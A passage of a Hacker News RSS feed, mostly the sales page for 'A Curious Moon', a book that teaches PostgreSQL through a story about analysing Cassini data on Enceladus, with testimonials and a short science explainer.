<p>Hopefully, you learned something new from this post, I would highly recommend picking up <em>The Ruby Programming Language</em> it has much more to offer and does an excellent job of teaching the intricacies of the language.</p>
<p>Thanks for reading!</p>
<p>I will be following this post up with another post about what I'm learning from <em>The Ruby Programming Language</em> so keep an eye out for that.</p>
<p>Feel free to connect with me on Twitter @connerjensen780</p></div></div>]]>
            </description>
            <link>https://www.connerjensen.com/blog/the_ruby_programming_language_review</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150125</guid>
            <pubDate>Thu, 19 Nov 2020 14:56:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Show HN: Auto Task Scheduler Built in Notion]]>
            </title>
            <description>
<![CDATA[
Score 6 | Comments 3 (<a href="https://news.ycombinator.com/item?id=25150038">thread link</a>) | @gogo61
<br/>
November 19, 2020 | https://rohitgupta.site/Auto-Task-Scheduler-b47d7c282eeb4ae0bd321f73ba75b4bd | <a href="https://web.archive.org/web/*/https://rohitgupta.site/Auto-Task-Scheduler-b47d7c282eeb4ae0bd321f73ba75b4bd">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://rohitgupta.site/Auto-Task-Scheduler-b47d7c282eeb4ae0bd321f73ba75b4bd</link>
            <guid isPermaLink="false">hacker-news-small-sites-25150038</guid>
            <pubDate>Thu, 19 Nov 2020 14:48:55 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[A Curious Moon]]>
            </title>
            <description>
<![CDATA[
Score 54 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25149803">thread link</a>) | @Tomte
<br/>
November 19, 2020 | https://bigmachine.io/products/a-curious-moon/ | <a href="https://web.archive.org/web/*/https://bigmachine.io/products/a-curious-moon/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="tcb_landing_page">
<div>
<div id="tve_flt"><div id="tve_editor" data-post-id="161773"><div data-inherit-lp-settings="1" data-css="tve-u-16cdc668863">

<div data-css="tve-u-16cdc61feee"><div data-aspect-ratio="16:9" data-float-visibility="mobile" data-overlay="0" data-type="vimeo" data-float="false" data-aspect-ratio-default="0" data-url="https://vimeo.com/247734637" data-float-width-m="300px" data-float-padding1-m="25px" data-float-padding2-m="25px" data-float-position="top-left" data-float-width-d="300px" data-float-padding1-d="25px" data-float-padding2-d="25px" data-css="tve-u-171ae0f3dad">
<div>
<div><iframe data-code="247734637" data-provider="vimeo" src="https://player.vimeo.com/video/247734637?portrait=1&amp;title=1&amp;color=fff&amp;byline=1&amp;autopause=0" data-src="https://player.vimeo.com/video/247734637?portrait=1&amp;title=1&amp;color=fff&amp;byline=1&amp;autopause=0" frameborder="0" allowfullscreen=""></iframe></div>
</div>
</div><div data-css="tve-u-1685be6002c">

<div><div data-css="tve-u-1685bea876e"><div data-css="tve-u-1685bea84b7"><div data-css="tve-u-1685beca9a6"><div data-css="tve-u-16cdd2b7da4"><p data-css="tve-u-1719fb93a47">Dive into &nbsp;<strong>raw data from the Cassini mission</strong> - straight from JPL, in the search for possible alien life. Oh yeah - <strong>and learn about PostgreSQL.</strong></p></div></div></div></div></div>
</div></div>
</div><div data-css="tve-u-16cd8a48aaa">

<div data-css="tve-u-16cd8a48ab5"><div data-css="tve-u-170e2ff2527">

<div><p data-tag="h2" data-css="tve-u-168603256ce"><h2 data-css="tve-u-16cdc6d1c80">You've found yourself in charge of a PostgreSQL database... <em>what now</em>?</h2></p><p data-css="tve-u-171a4c58cd8"><strong>Data is a powerful drug</strong> - it's the life blood of your business. How do you ensure that it's <strong>correct and tells the right story</strong>? PostgreSQL can help, but there's a lot more to this game.</p><div data-css="tve-u-1685c0e6c3b"><div data-css="tve-u-1685c0e6834"><div data-css="tve-u-16cdd398a82"><div data-css="tve-u-1685c14ddde"><div data-css="tve-u-16cdd2d3630"><p>Starting an application is simple enough, whether you use migrations, a model-synchronizer or good old-fashioned hand-rolled SQL. A year from now, however, when your app has grown and you're trying to measure what's happened... the story can quickly change when <strong>data is overwhelming you </strong>and you need to <strong>make sense</strong> of what's been accumulating.&nbsp;</p><p>Learning how PostgreSQL works is&nbsp;<em>just one aspect</em> of working with data. PostgreSQL is there to enable, enhance and extend what you do as a developer/DBA. And just like any tool in your toolbox, <strong>it can help you create crap, slice off some fingers, or help you be the superstar that you are</strong>.</p><p>That's the perspective of&nbsp;<em>A Curious Moon</em> - data is the truth, data is your friend, data is your business. The tools you use (namely PostgreSQL) are simply there to safeguard your treasure and help you understand what it's telling you.</p></div></div></div><div data-css="tve-u-16cdd398b63"><div data-css="tve-u-1685c1512d6"><div data-css="tve-u-1685c127b2d"><p>But <strong>what does it mean to be "data-minded"? </strong>How do you even get started? These are good questions and ones I struggled with when outlining this book. I quickly realized that the only way you could truly understand the power and necessity of solid databsae design was to <strong>live the life of a new DBA... thrown into the fire</strong> like we all were at some point...</p><p>Meet Dee Yan, our fictional intern at Red:4 Aerospace. She's just been handed the keys to <strong>a massive set of data, straight from Saturn</strong>, and she has to load it up, evaluate it and then analyze it for a critical project. She knows that PostgreSQL exists... but that's about it.</p><p>Much more than a tutorial, this book has a narrative element to it a bit like&nbsp;<em>The Martian</em>, where you get to know Dee and the problems she faces as a new developer/DBA... and how she solves them.</p><p>The truth is in the data...</p></div></div></div></div></div></div>
</div></div>
</div><div data-css="tve-u-168604cedc5" data-inherit-lp-settings="1">

<div data-css="tve-u-1685c8a1093"><p data-tag="h2" data-css="tve-u-1685c0e8154"><h2 data-css="tve-u-1685c8db5fd"><em>A Curious Moon</em>: Exploring Cassini's Data with PostgreSQL</h2></p><div data-css="tve-u-1685c40e6db">

<div data-css="tve-u-1685c3f3ad3"><div><div><div><div><p><span><img alt="" data-id="357" width="330" data-init-width="550" height="530" data-init-height="883" title="cover_v3" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2018/05/cover_v3.jpg" data-css="tve-u-171a8e23a1a" data-width="330" data-height="530" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/cover_v3.jpg?w=550&amp;ssl=1 550w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/cover_v3.jpg?resize=187%2C300&amp;ssl=1 187w" sizes="(max-width: 330px) 100vw, 330px"></span></p></div></div><div><div><div data-css="tve-u-171a9ed79f5"><p data-css="tve-u-171a8e37403">Follow along with Dee Yan, our fictional data science intern, as she assumes the job of interim database administrator at the fictional aerospace startup, Red:4. Sheâ€™ll&nbsp;<strong>learn PostgreSQL</strong>&nbsp;like we all do:&nbsp;<em>on the job and under pressure</em>.</p><p>Youâ€™ll start out with the basics: creating tables and importing data. Soon, however, youâ€™ll be awash in glorious SQL and data from space (<strong>the NASA/JPL archives of the Cassini mission</strong>), creating functions, common table expressions and calculating aggregates using window functions all in the name of science while trying to&nbsp;<strong>figure out if thereâ€™s life under the ice of a very curious little moon.</strong></p></div></div></div></div></div></div>
</div></div>
</div><div data-css="tve-u-16cd8a366f5" data-inherit-lp-settings="1">

<div data-css="tve-u-16cd8a36703"><div data-css="tve-u-171a8e493b9" tcb-template-name="Quote 15" tcb-template-id="41894" tcb-template-pack="137" data-keep-css_id="1"><div data-css="tve-u-171a8e493ba">

<div data-css="tve-u-171a8e493bc"><div data-css="tve-u-171a8e493bd"><div data-css="tve-u-171a8e493be"><div data-css="tve-u-171a8e493bf"><div data-css="tve-u-171a8e493c0"><p><span><img alt="" width="208" height="202" title="loren_stewart_200x" data-id="362" src="https://bigmachine.io/wp-content/uploads/2018/05/loren_stewart_200x.png" data-init-width="200" data-init-height="194" loading="lazy" data-css="tve-u-171a8e587bf" data-width="208" data-height="202" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/loren_stewart_200x.png?w=200&amp;ssl=1 200w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/loren_stewart_200x.png?resize=180%2C175&amp;ssl=1 180w" sizes="(max-width: 208px) 100vw, 208px"></span></p><p>&nbsp;<strong>Loren Steward</strong></p></div></div><div data-css="tve-u-171a8e493c3"><div data-css="tve-u-171a8e493c4"><p><span><img loading="lazy" alt="" width="217" height="170" title="Quotation_marks_image_03" data-id="41605" src="https://bigmachine.io/wp-content/uploads/tcb_content_templates/contentblock/images/Quotation_marks_image_03.png" data-css="tve-u-171a8e62de6" data-width="217" data-height="170" data-init-width="175" data-init-height="137"></span></p><p data-css="tve-u-171a8e67921"><em><strong>A Treasure Trove</strong></em></p><p data-css="tve-u-171a8e55e4f">"Iâ€™ve found the book to be a treasure trove of Postgres features. CTEs are blowing my mind right now. Iâ€™m a backend engineer, and Iâ€™ve been sharing what Iâ€™ve learned with my coworker who is a DBA. She is picking &nbsp;up some tips through me now! I havenâ€™t found a good, engaging tutorial for these intermediate/advanced Postgres tricks, and "A Curious Moon" fills this gap. As a bonus, Iâ€™m also picking up some bash tips from the book."</p></div></div></div></div></div>
</div></div></div>
</div><div data-css="tve-u-168602fef0f" data-inherit-lp-settings="1">

<div data-css="tve-u-1686030115d"><p data-tag="h3" data-css="tve-u-168603280cf"><h3 data-css="tve-u-1686030ea3f">You'll dig in to some of the most amazing data of our lifetime...</h3></p><p data-css="tve-u-16860558abc">I won't waste your time with sleep-inducing demos and examples - we're going to <strong>hit the ground running</strong> by <strong>importing millions of records</strong> into PostgreSQL right from the command line and then we're going to interrogate it for correctness. From there we <strong>put our detective hats on</strong> and get to work.</p><div data-css="tve-u-171a8f8117e" tcb-template-name="Resource List 06" tcb-template-id="41686" tcb-template-pack="137" data-keep-css_id="1"><div data-css="tve-u-171a8f8117f">

<div data-css="tve-u-171a8f81180"><div data-css="tve-u-171a8fba418" tcb-template-name="Team 10" tcb-template-id="41907" data-keep-css_id="1"><div data-css="tve-u-171a8fba419">

<div data-css="tve-u-171a8fba41a"><div data-css="tve-u-171a8fba41c">

<div data-css="tve-u-171a8fba41d"><div data-css="tve-u-171a8fba41e"><div data-css="tve-u-171a8fba41f"><div><div data-css="tve-u-171a8fba420"><div data-css="tve-u-171a8fba421">

<div data-css="tve-u-171a8fba423"><div data-css="tve-u-171a9010f1a">

<div><p><span><img alt="" data-id="161826" width="800" data-init-width="800" height="575" data-init-height="575" title="14 copy" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/14-copy.png" srcset="https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/14-copy.png?w=800&amp;ssl=1 800w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/14-copy.png?resize=300%2C216&amp;ssl=1 300w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/14-copy.png?resize=768%2C552&amp;ssl=1 768w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/14-copy.png?resize=247%2C178&amp;ssl=1 247w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/14-copy.png?resize=510%2C367&amp;ssl=1 510w" sizes="(max-width: 800px) 100vw, 800px"></span></p><p data-css="tve-u-171a900da73"><h3 data-css="tve-u-171a8fd31ac">Working with the PostgreSQL CLI</h3></p><p data-css="tve-u-16d9dc501ff"><strong>We don't have time for fluffy tooling!</strong> Yes there are GUIs and visual tools out there, but SQL with PostgreSQL is simple and easy to use when describing the precise table and index set that you want.</p></div>
</div></div>
</div></div></div><div><div data-css="tve-u-171a8fba432"><div data-css="tve-u-171a9ee5b8c">

<div><p><span><img alt="" data-id="161840" width="309" data-init-width="800" height="222" data-init-height="575" title="00-csvs" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/00-csvs.png" mt-d="-1" data-css="tve-u-171a905f8cb" data-width="309" data-height="222" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/00-csvs.png?w=800&amp;ssl=1 800w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/00-csvs.png?resize=300%2C216&amp;ssl=1 300w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/00-csvs.png?resize=768%2C552&amp;ssl=1 768w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/00-csvs.png?resize=247%2C178&amp;ssl=1 247w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/00-csvs.png?resize=510%2C367&amp;ssl=1 510w" sizes="(max-width: 309px) 100vw, 309px"></span></p><p data-css="tve-u-171a9018c8d"><h3 data-css="tve-u-171a9018c8e">importing data from massive csv files</h3></p><p data-css="tve-u-171a906570f"><strong>You'll import data like a pro, using the command line and a Makefile.</strong> There are GUIs you could use, but here at Red:4 we believe in keeping things simple and powerful..</p></div>
</div></div></div><div><div><div data-css="tve-u-171a9ee473f">

<div><p><span><img alt="" data-id="161842" width="309" data-init-width="889" height="222" data-init-height="575" title="leapyear" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/leapyear.png" mt-d="-1" data-css="tve-u-171a9078bd8" data-width="309" data-height="222" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/leapyear.png?zoom=2&amp;resize=309%2C222&amp;ssl=1 618w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/leapyear.png?zoom=3&amp;resize=309%2C222&amp;ssl=1 927w" sizes="(max-width: 309px) 100vw, 309px"></span></p><p data-css="tve-u-171a9078bd9"><h3 data-css="tve-u-171a9078bda">WEEDING OUT THE INEVITABLE CRAP DATA</h3></p><p data-css="tve-u-171a9081ff7"><strong>You will become "data minded".</strong>You'll go through a basic audit process from real, raw data from JPL. It doesn't matter where the data is from, it will&nbsp;<em>always have errors</em>.</p></div>
</div></div></div></div></div></div>
</div></div>
</div></div></div>
</div><div data-css="tve-u-171a8f8117f">

<div data-css="tve-u-171a8f81180"><div data-css="tve-u-171a90bbfa7" tcb-template-name="Team 10" tcb-template-id="41907" data-keep-css_id="1"><div data-css="tve-u-171a8fba419">

<div data-css="tve-u-171a8fba41a"><div data-css="tve-u-171a8fba41c">

<div data-css="tve-u-171a8fba41d"><div data-css="tve-u-171a8fba41e"><div data-css="tve-u-171a8fba41f"><div><div data-css="tve-u-171a8fba420"><div data-css="tve-u-171a8fba421">

<div data-css="tve-u-171a8fba423"><div data-css="tve-u-171a9010f1a">

<div><p><span><img alt="" data-id="161844" width="1368" data-init-width="1368" height="916" data-init-height="916" title="shot_186" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/shot_186.jpg" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_186.jpg?w=1368&amp;ssl=1 1368w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_186.jpg?resize=300%2C201&amp;ssl=1 300w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_186.jpg?resize=1024%2C686&amp;ssl=1 1024w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_186.jpg?resize=768%2C514&amp;ssl=1 768w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_186.jpg?resize=247%2C165&amp;ssl=1 247w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_186.jpg?resize=510%2C341&amp;ssl=1 510w" sizes="(max-width: 1368px) 100vw, 1368px"></span></p><p data-css="tve-u-171a900da73"><h3 data-css="tve-u-171a8fd31ac">TRIAGING AND SIZING UP WHAT THE DATA MEANS</h3></p><p data-css="tve-u-171a90c3a39"><span data-css="tve-u-1634af88282"><strong>You'll sleuth through raw Cassini data using basic queries</strong>. Pulling data in is only part of the process â€“ looking for clues and understanding what you're seeing is the next step. To do this you'll use <strong>Common Table Expressions</strong>, <strong>Full Text Search</strong> indexing and <strong>Windowing Functions</strong>.</span></p></div>
</div></div>
</div></div></div><div><div data-css="tve-u-171a8fba432"><div data-css="tve-u-171a9018c8b">

<div><p><span><img alt="" data-id="161845" width="370" data-init-width="544" height="212" data-init-height="312" title="shot_187" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/shot_187.jpg" mt-d="0" data-css="tve-u-171a915ce14" data-width="370" data-height="212" ml-d="-4" srcset="https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_187.jpg?w=544&amp;ssl=1 544w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_187.jpg?resize=300%2C172&amp;ssl=1 300w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_187.jpg?resize=247%2C142&amp;ssl=1 247w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_187.jpg?resize=510%2C293&amp;ssl=1 510w" sizes="(max-width: 370px) 100vw, 370px"></span></p><p data-css="tve-u-171a911509f"><h3 data-css="tve-u-171a9018c8e">OPTIMIZING QUERIES</h3></p><p data-css="tve-u-171a906570f"><strong>You'll speed up slow queries with built-in analysis tools</strong> and objects. The Cassini data dump is gigantic, and sifting through the analysis records can be time consuming! You'll use EXPLAIN and ANALYZE to figure out where to put your indexes and when it makes sense to build a materialized view, which is data cached on disk.</p></div>
</div></div></div><div><div><div data-css="tve-u-171a9078bd5">

<div><p><span><img alt="" data-id="161858" width="309" data-init-width="1058" height="233" data-init-height="798" title="shot_188" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/shot_188.jpg" mt-d="-4" data-css="tve-u-171a9154582" data-width="309" data-height="233" ml-d="0" srcset="https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_188.jpg?w=1058&amp;ssl=1 1058w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_188.jpg?resize=300%2C226&amp;ssl=1 300w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_188.jpg?resize=1024%2C772&amp;ssl=1 1024w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_188.jpg?resize=768%2C579&amp;ssl=1 768w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_188.jpg?resize=247%2C186&amp;ssl=1 247w, https://i0.wp.com/bigmachine.io/wp-content/uploads/2020/04/shot_188.jpg?resize=510%2C385&amp;ssl=1 510w" sizes="(max-width: 309px) 100vw, 309px"></span></p><p data-css="tve-u-171a9078bd9"><h3 data-css="tve-u-171a9078bda">verifying what we have using sql</h3></p><p data-css="tve-u-171a9081ff7">NASA is a very thorough organization, but it's staffed by humans and humans like spreadsheets and <strong>spreadsheets destroy data</strong>. You'll use mathematical analysis to verify <strong>flyby altitudes and speeds</strong> using data from the INMS during the 22 close encounters with Enceladus.</p></div>
</div></div></div></div></div></div>
</div></div>
</div><div data-css="tve-u-171a91d3d1c" tcb-template-name="Call to Action 06" tcb-template-id="41514" data-keep-css_id="1"><div data-css="tve-u-171a91d3d1d">

<div><div data-css="tve-u-171a91d3d1e">

<div data-css="tve-u-171a91d3d20"><div data-css="tve-u-171a91d3d21"><div data-css="tve-u-171a91d3d22"><div data-css="tve-u-171a91d3d23"><div><p><span><img alt="" width="232" height="180" title="Image10017" data-id="161853" src="https://bigmachine.io/wp-content/uploads/2020/04/Image10017.png" data-init-width="946" data-init-height="733" loading="lazy" data-css="tve-u-171a91e5bbd" data-width="232" data-height="180" srcset="https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image10017.png?w=946&amp;ssl=1 946w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image10017.png?resize=300%2C232&amp;ssl=1 300w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image10017.png?resize=768%2C595&amp;ssl=1 768w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image10017.png?resize=247%2C191&amp;ssl=1 247w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image10017.png?resize=510%2C395&amp;ssl=1 510w" sizes="(max-width: 232px) 100vw, 232px"></span></p></div></div><div data-css="tve-u-171a91d3d25"><div data-css="tve-u-171a91d3d26"><p data-css="tve-u-171a91d3d27"><h3 data-css="tve-u-171a9206468">You'll run queries looking for the presence of life under this amazing moon.</h3></p><div data-css="tve-u-171a91d3d29"><p data-css="tve-u-171a91e4ce5"><span data-css="tve-u-1634af8827d"><strong>You'll finally perform the ultimate analysis on very real scientific data:&nbsp;<em>Is There Life Under the Ice of Enceladus?</em>&nbsp;&nbsp;</strong></span></p><p data-css="tve-u-171a91e4ce5"><span data-css="tve-u-1634af8827d"><strong></strong>You will have all the data you need to support this claim: thermal, chemical and mineralogical results from two of the most sensitive instruments humans have ever created. You'll run the query and see the results for yourself!</span></p></div></div></div></div></div></div>
</div></div>
</div></div></div></div>
</div></div></div>
</div><div data-css="tve-u-168604d64ed">

<div data-css="tve-u-168604e56fa"><p data-tag="h3" data-css="tve-u-1687a2f0c50"><h3>Working with data can be the most fun you've ever had at work.</h3></p><p>It's a discovery that most DBAs don't want "app devs" to know:&nbsp;<strong><em>working with data is intoxicating</em></strong>. Learning the skills you need to effectively work with data can be one of the <span data-css="tve-u-171a925f9eb">best investements in your career</span>... just ask these people...</p><div data-css="tve-u-1602b1ebd26" data-ct-name="Resume Clients" data-ct="testimonial-7342" data-element-name="Testimonial">

<div data-css="tve-u-16cdcc0fe5a"><div data-css="tve-u-16860547721"><div data-css="tve-u-16870ae36ee"><div><div data-css="tve-u-168605c3908"><div data-css="tve-u-1688010799d">

<div><div data-css="tve-u-16afdd5028d">

<div><div data-css="tve-u-16afdd58015"><div data-css="tve-u-16afdd0b596" data-float="1">

<div data-css="tve-u-1686061b5f0"><p><span><img alt="" width="400" height="400" title="tompkins" data-id="389" src="https://bigmachine.io/wp-content/uploads/2018/05/tompkins.jpg" data-init-width="400" data-init-height="400" loading="lazy" srcset="https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/tompkins.jpg?w=400&amp;ssl=1 400w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/tompkins.jpg?resize=280%2C280&amp;ssl=1 280w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/tompkins.jpg?resize=300%2C300&amp;ssl=1 300w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/tompkins.jpg?resize=100%2C100&amp;ssl=1 100w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/tompkins.jpg?resize=150%2C150&amp;ssl=1 150w" sizes="(max-width: 400px) 100vw, 400px"></span></p></div>
</div></div></div>
</div><div data-css="tve-u-168800e7098">

<div data-css="tve-u-16afd6a6c48"><p data-css="tve-u-168605f9847"><strong><strong><strong>Compulsively readable. Recommended.</strong></strong></strong></p><p data-css="tve-u-1686119f5bd">"Reading through&nbsp;<em>A Curious Moon</em>... It's like reading&nbsp;<em>The Martian</em>, only instead of trying to survive in the hostile environment of another planet, it's about trying to survive in the hostile environment of snarky DBAs. Compulsively readable. Recommended."</p></div>
</div></div>
</div></div></div><div><div data-css="tve-u-1687b353150"><div data-css="tve-u-1687091a411">

<div><div data-css="tve-u-16afdd5028d">

<div><div data-css="tve-u-16afdd58015"><div data-css="tve-u-16afdd0b596" data-float="1">

<div data-css="tve-u-1686061b5f0"><p><span><img alt="" width="400" height="400" title="meggan" data-id="386" src="https://bigmachine.io/wp-content/uploads/2018/05/meggan.jpg" data-init-width="400" data-init-height="400" loading="lazy" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/meggan.jpg?w=400&amp;ssl=1 400w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/meggan.jpg?resize=280%2C280&amp;ssl=1 280w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/meggan.jpg?resize=300%2C300&amp;ssl=1 300w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/meggan.jpg?resize=100%2C100&amp;ssl=1 100w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2018/05/meggan.jpg?resize=150%2C150&amp;ssl=1 150w" sizes="(max-width: 400px) 100vw, 400px"></span></p></div>
</div></div></div>
</div><div data-css="tve-u-168800e8e1f">

<div data-css="tve-u-16afd6a80ba"><p data-css="tve-u-168605f9847"><strong><strong>I am&nbsp;<em>loving</em>&nbsp;the book!</strong></strong></p><p data-css="tve-u-17493010a6a">I am loving the book! The narrative format is like no other programming book I've ever read, and it's really keeping me engaged and interested. I've struggled in the past to keep pushing through programming books that are dry &amp; stock standard, but the characters in A Curious Moon make the book relatable and it makes me want to learn.</p></div>
</div></div>
</div></div></div><div data-css="tve-u-1749300e95c"><div data-css="tve-u-168605c5931"><div data-css="tve-u-1687b4daac8">

<div><div data-css="tve-u-16afdd5028d">

<div><div data-css="tve-u-16afdd58015"><div data-css="tve-u-16afdd0b596" data-float="1">

<div data-css="tve-u-1686061b5f0"><p><span><img alt="" width="210" height="210" title="george" data-id="402" src="https://bigmachine.io/wp-content/uploads/2018/05/george.jpg" data-init-width="210" data-init-height="210" loading="lazy" srcset="https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/george.jpg?w=210&amp;ssl=1 210w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/george.jpg?resize=180%2C180&amp;ssl=1 180w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/george.jpg?resize=100%2C100&amp;ssl=1 100w, https://i2.wp.com/bigmachine.io/wp-content/uploads/2018/05/george.jpg?resize=150%2C150&amp;ssl=1 150w" sizes="(max-width: 210px) 100vw, 210px"></span></p></div>
</div></div></div>
</div><div data-css="tve-u-1688037c1e9">

<div data-css="tve-u-16afd6a933b"><p data-css="tve-u-168605f9847"><strong>One of the best technical books I've ever read.</strong></p><p data-css="tve-u-1686119f5bd">"I really am enjoying this book! It is one of the best technical books I've ever read, and I read more than 40 books per year (technical and non-technical). What I like most about this book is that you mixed a sci-fi story with technical writing. It is like a novel for geeks!"<em></em></p></div>
</div></div>
</div></div></div></div></div></div>
</div></div>
</div><div>

<div data-css="tve-u-171a9df25e6"><div data-css="tve-u-171a9f9c219">

<div><p data-tag="h3" data-css="tve-u-16860dbc5e4"><h3 data-css="tve-u-171a9be5c3f">Wait are you serious? Enceladus? Possible life under its icy shell?</h3></p><p data-css="tve-u-168709e7e48">Yes, absolutely. Back in 2005 Cassini did a routine flyby of Enceladus, a moon that's about the size of Great Britain (313 mi in diameter). It's the most reflective body in the solar system, covered with smooth ice... except for its south pole...</p><div><div data-css="tve-u-171aa0692ac"><div><div><p><span><img alt="" data-id="161850" width="677" data-init-width="1000" height="694" data-init-height="1025" title="Image8807" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/Image8807.jpg" data-css="tve-u-171a9c34e97" data-width="677" data-height="694" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image8807.jpg?w=1000&amp;ssl=1 1000w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image8807.jpg?resize=293%2C300&amp;ssl=1 293w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image8807.jpg?resize=768%2C787&amp;ssl=1 768w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image8807.jpg?resize=247%2C253&amp;ssl=1 247w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image8807.jpg?resize=510%2C523&amp;ssl=1 510w" sizes="(max-width: 677px) 100vw, 677px"></span></p></div></div><div><div><p data-css="tve-u-171a9ca6462">A Great Cosmic Mystery</p><div data-css="tve-u-171a9ca8f87"><p data-css="tve-u-171a9c7c9dd">Turns out this little moon gets squeezed between Jupiter and Titan and the <strong>gravitational pull grinds out some heat</strong> within its core. Heat that produces <strong>temperatures up <em>90 C</em></strong> in some spots, which look suspiciously like the deep water plumes we see here on Earth.</p><p data-css="tve-u-171a9c3f5d6">Oh, but it gets weirder...</p></div></div></div></div></div><p data-css="tve-u-171a9cb2eb5">The Bioreactor</p><div><div><div><div><div data-css="tve-u-171a9c3dd3f"><p data-css="tve-u-171a9c3f5d6">That heated water produces plumes at the moon's south pole which jet material into space. We didn't know what was in that material until 2007, when <strong>Cassini flew right through them</strong> at ridiculously high speeds and low elevation.</p><p data-css="tve-u-171a9c3f5d6">The onboard mass spectrometers scooped it up and... wouldn't ya know... it's <strong>sea water</strong>. <strong>There's a salty ocean under the ice</strong>&nbsp; and it containes <strong>methane</strong> and <strong>hydrocarbons</strong> that mirror the deep sea "chimneys" that we have here on Earth. This has led scientists to speculate that Enceladus is a <em>bioreactor</em>, capable of producing life in extraordinary circumstances.&nbsp;</p></div></div></div><div><div><p><span><img alt="" data-id="161849" width="677" data-init-width="627" height="694" data-init-height="531" title="Image8791" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/Image8791.jpg" data-css="tve-u-171a9c34e97" data-width="677" data-height="694" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image8791.jpg?zoom=2&amp;resize=677%2C694&amp;ssl=1 1354w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/Image8791.jpg?zoom=3&amp;resize=677%2C694&amp;ssl=1 2031w" sizes="(max-width: 677px) 100vw, 677px"></span></p></div></div></div></div><p><span><img alt="" data-id="161852" width="1317" data-init-width="1317" height="548" data-init-height="548" title="09" loading="lazy" src="https://bigmachine.io/wp-content/uploads/2020/04/09.jpg" srcset="https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/09.jpg?w=1317&amp;ssl=1 1317w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/09.jpg?resize=300%2C125&amp;ssl=1 300w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/09.jpg?resize=1024%2C426&amp;ssl=1 1024w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/09.jpg?resize=768%2C320&amp;ssl=1 768w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/09.jpg?resize=247%2C103&amp;ssl=1 247w, https://i1.wp.com/bigmachine.io/wp-content/uploads/2020/04/09.jpg?resize=510%2C212&amp;ssl=1 510w" sizes="(max-width: 1317px) 100vw, 1317px"></span></p><div 